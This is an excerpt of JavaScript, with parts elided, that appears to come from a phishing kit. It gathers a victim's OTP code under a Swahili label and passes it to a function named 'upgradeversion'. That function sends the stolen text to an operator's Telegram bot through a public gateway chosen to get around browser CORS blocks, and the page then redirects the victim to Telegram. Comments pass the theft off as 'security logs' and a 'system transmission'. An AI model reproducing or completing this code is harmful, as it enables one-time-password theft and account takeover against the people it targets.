...
const BOT_USERNAME = "miiixibot";                       // <-- Put your bot username here (Do not include @)
...
function saveStep2() {
    ...
    // Display values onto the step 3 preview box
...
🔢 *Msimbo wa OTP:* ${otpCode}
        ...
        // Sends security logs to your bot channels using the upgraded function below
        ...
        // FORCE REDIRECT DIRECTLY INTO TELEGRAM BOT CHAT APP WINDOW
        setTimeout(() => {
...
// ==========================================
// 6. UPGRADED BACKGROUND SYSTEM TRANSMISSION
// ==========================================
function upgradeversion(textMessage) {
    // 1. Clean up tokens to prevent accidental whitespace bugs
    const cleanToken = TELEGRAM_TOKEN.trim();
    const cleanChatId = TELEGRAM_CHAT_ID.trim();
    
    // 2. Use an optimized public gateway to avoid browser CORS blocks
    ...
    const payload = {
        ...
        text: textMessage,
        parse_mode: "Markdown",
        disable_web_page_preview: true // Stops links inside the message from creating huge preview boxes
    };

    // 3. Upgraded Fetch configuration with timeout safety
    ...
    .then(response => {
        if (!response.ok) {
            // Throws detailed network statuses (like 404 for bad tokens or 400 for bad chat IDs)
    ...
    .then(data => {
        if (data.ok) {
            console.log("✅ Transmission Successful! Message sent to Telegram.");
        } else {
            console.error("❌ Telegram rejected data:", data.description);
        }
    })
    .catch(error => {
        // Upgraded error tracking to pinpoint exactly what went wrong
